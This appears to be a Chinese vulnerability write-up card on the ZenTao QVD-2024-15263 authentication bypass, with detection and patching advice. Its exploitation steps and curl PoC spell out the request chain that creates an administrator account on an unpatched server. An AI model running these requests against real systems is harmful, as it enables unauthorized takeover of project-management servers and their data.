---
id: web-generic-auth-zentao-qvd-2024-15263-testcase-deny-session-user-bypass
title: 禅道 QVD-2024-15263 认证绕过：testcase deny 写入 session user，加 HTTP_X_REQUESTED_WITH 参数通过 API 鉴权并创建管理员
type: scenario
domain: web
path: web/generic/auth
technique: zentao-testcase-deny-session-user-api-auth-bypass
aliases:
- 禅道认证绕过
- QVD-2024-15263
- ZenTao auth bypass
- savexmindimport
- common deny session user
- HTTP_X_REQUESTED_WITH 参数绕过
- api.php/v1/users 创建管理员
tags:
- web
- auth-bypass
- zentao
- php
- session
- api
- privilege-escalation
- cve
- qvd-2024-15263
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
affected_versions: 禅道开源版 16.x <= 版本 < 18.12；企业版 6.x <= 版本 < 8.12；旗舰版 3.x <= 版本 < 4.12
verification:
  verified_by: verifier-V431
  verified_at: '2026-11-09T18:36:19+08:00'
  notes: 已对照原文与 8/8 图片核对：deny() 写 session user、isAjaxRequest 信任 $_GET 的 HTTP_X_REQUESTED_WITH、API entry 仅查 user/guest、POST /api.php/v1/users 返回 403 但用户已创建（用户列表可见 test1/高层管理）均与截图一致；卡片按截图把原文口述的 404 纠正为 401；CVE QVD-2024-15263 与版本区间与原文一致。未验证点：PoC 未在真实目标执行，企业版/旗舰版区间未实测。
---

## 一句话结论

禅道 `testcase` 控制器的 `saveXmindImport` 在无权限时会调用 `common` 模型的 `deny()`，而 `deny()` 会先把当前 `$app->user` 对象写入 session 并回填 `$app->user`；攻击者用 `api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest` 触发这条路径（`isAjaxRequest()` 同时检查 `$_GET`，所以把 header 名当查询参数即可），即可得到一个带 `user` 属性的会话，绕过 `/api.php/v1/*` 入口“session 无 user 或 user=guest 才拒绝”的检查，随后调用 `POST /api.php/v1/users` 在无进一步鉴权的情况下创建管理员用户（响应 403 但实际已创建），再以该用户登录接管系统。

## 原理

- **deny() 的副作用**：`module/common/model.php` 的 `deny($module, $method, $reload=true)` 在 `$reload` 为真时执行：取 `$this->app->user`，重新计算 `rights`、`groups`、`admin`，然后 `$this->session->set('user', $user)` 并 `$this->app->user = $this->session->user`，最后再用 `commonModel::hasPriv()` 判断是否放行。也就是说，本意是“拒绝并重新鉴权”的函数，先把一个 user 对象持久化进了 session。
- **触发 deny 的入口**：`module/testcase/control.php` 的 `saveXmindImport()` 开头是 `if(!commonModel::hasPriv("testcase","importXmind")) $this->loadModel('common')->deny('testcase','importXmind');`。未登录/无权限用户访问 `api.php?m=testcase&f=savexmindimport` 就会走到 `deny()`，从而写入 session user。
- **isAjaxRequest 的 GET 兼容**：`helper::isAjaxRequest()` 的判断是 `(isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest') || (isset($_GET['HTTP_X_REQUESTED_WITH']) ...)`；因此不需要真的发 `X-Requested-With` 头，只要在 URL 里加 `&HTTP_X_REQUESTED_WITH=XMLHttpRequest` 就能让 testcase 控制器实例化/动作通过 ajax 检查。
- **API 入口只查 user 是否存在**：`framework/api/entry.class.php` 的构造函数在 `action == 'options'` 时返回 204，否则检查 `if(!isset($this->app->user) or $this->app->user->account == 'guest') throw 401 Unauthorized`。它只判断 session 里有没有 user 对象、account 是否为 `guest`，不验证该会话是否真正完成登录；`deny()` 写入的 user 对象满足条件（account 不是 `guest`），于是后续 `/api.php/v1/*` 接口被放行。
- **用户创建无二次鉴权**：`POST /api.php/v1/users` 的创建逻辑没有继续校验调用者权限/角色，攻击者提交 `{"account":"test1","password":"Test123","realname":"test","role":"top","group":"1"}` 即可创建新用户；接口返回 403（错误处理路径不严谨），但用户已写入数据库，用户列表可见 `test1 / 高层管理`。以该账号登录即可获得管理员权限。
- **为什么形成完整绕过**：`deny()` 的“重新鉴权”副作用 + API 入口的弱检查 + 用户创建接口缺权限校验三者叠加，使一个未认证请求最终变成管理员账号创建；无需知道任何现有口令。

## 触发条件

- 目标为受影响版本（开源版 16.x–18.11、企业版 6.x–8.11、旗舰版 3.x–4.11 左右，按原文区间）；
- `/zentao/api.php`（或对应部署路径）可访问，`testcase` 模块路由可达；
- 允许匿名/低权限访问 `api.php?m=testcase&f=savexmindimport`，请求可带任意查询参数；
- 目标未对 `/api.php/v1/users` 的用户创建做额外鉴权/WAF 限制。

## 利用步骤

1. 发送 GET 触发 deny 并拿到会话：
   `GET /zentao/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest`
   响应可能 500，但会 `Set-Cookie: zentaosid=...`，且 session 已写入 user。
2. 携带该 `zentaosid` 调用用户创建接口：
   `POST /zentao/api.php/v1/users`，JSON `{"account":"test1","password":"Test123","realname":"test","role":"top","group":"1"}`。
   响应常为 403 Forbidden，但用户实际已创建（可访问后台用户列表确认）。
3. 用新账号 `test1/Test123` 登录禅道后台，验证是否具备管理员/高层管理权限；配合其他漏洞进一步接管服务器。
4. 清理/取证：记录请求 URL、cookie、创建的用户名与时间，检查是否有其他被创建账号。

## PoC

```bash
# 1) 触发 deny()，写入 session user
curl -i -c cookie.txt \
  'http://target/zentao/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest'

# 2) 用同一会话创建管理员用户（返回 403 也可能已创建）
curl -i -b cookie.txt -X POST \
  'http://target/zentao/api.php/v1/users' \
  -H 'Content-Type: application/json' \
  -d '{"account":"test1","password":"Test123","realname":"test","role":"top","group":"1"}'
```

随后用 `test1 / Test123` 登录后台确认权限；PoC 仅用于授权测试，未在真实目标执行。

## 变体与关联

- 变体：`HTTP_X_REQUESTED_WITH` 用查询参数或真实请求头均可；其他会调用 `common->deny()` 且可匿名到达的控制器/动作也可能产生同样的 session user 副作用。
- 变体：session user 写入后，除 `/api.php/v1/users` 外的其他 API 接口也可能被放行，可按接口清单继续探测（创建项目、上传、读取用户等）。
- 关联：[[web-generic-auth-zentao-file-delete-idor]]（禅道其他鉴权/IDOR 问题）、[[web-php-rce-zentao-captcha-session-repo-checkconnection-exec]]（禅道会话/命令执行链）、[[web-generic-sqli-zentao-router-setversion-account-preath]]（禅道 SQL 注入）。
- 边界：不同禅道版本/部署路径（`/zentao/www/`、`/zentao/`）与路由大小写可能不同；企业版/旗舰版需按对应版本验证；创建用户返回 403 时需以用户列表/登录结果为准。

## 检测与防御

- 升级到 18.12 及以上（企业版 8.12、旗舰版 4.12 对应版本）。
- 检测：访问日志中出现 `api.php?m=testcase&f=savexmindimport` 且带 `HTTP_X_REQUESTED_WITH` 查询参数；随后同一 `zentaosid` 对 `/api.php/v1/users` 的 POST；403 响应后出现新用户/新登录。
- 修复思路：`deny()` 不应把未认证的 user 对象写入 session 后再依赖 session 判断；API 入口应校验真实登录态（如 session 中的认证标记/令牌），而非仅 `isset($app->user)`；`/api.php/v1/users` 创建用户必须做管理员权限校验；对 `isAjaxRequest()` 只信任请求头而非 `$_GET`。
- 加固：WAF 拦截 `HTTP_X_REQUESTED_WITH` 出现在 query string 的请求；限制 `/api.php` 仅内网/白名单访问；审计用户创建与权限变更日志。
